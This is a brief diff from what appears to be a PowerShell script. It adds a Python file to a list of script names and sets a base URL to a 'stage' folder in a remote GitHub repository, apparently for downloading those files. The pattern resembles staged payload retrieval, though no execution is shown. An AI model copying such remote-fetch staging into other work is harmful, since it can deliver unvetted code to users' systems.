@@ -12,7 +12,8 @@ $files = @(
     "kS1.ps1",
     "kS2.ps1",
     "jS2.ps1",
-    "jS3.ps1"
+    "jS3.ps1",
+    "gS2.py"
 )
 
 $base = "https://raw.githubusercontent.com/encryptedSubject/subject1/main/stage/"
